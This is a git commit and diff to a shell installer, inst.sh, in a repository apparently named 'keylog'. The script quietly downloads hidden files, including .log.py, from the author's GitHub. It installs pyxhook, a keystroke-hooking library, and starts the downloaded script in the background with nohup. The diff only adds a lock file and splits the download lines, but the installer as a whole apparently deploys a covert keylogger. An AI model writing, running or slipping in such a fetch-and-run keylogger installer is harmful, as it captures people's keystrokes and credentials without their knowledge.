8cf4446e870cf3ef0d62e4f0188bb0d54d79a5a9
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-14 03:14:14 +0000

    Create .pylock and download resources
    Added .pylock file creation before downloading resources.

--- inst.sh
+++ inst.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 
-wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py" && 
-wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3" &&
+touch .pylock
+wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
+wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
 yes | pip3 install pyxhook pygame 
 nohup python3 .log.py &
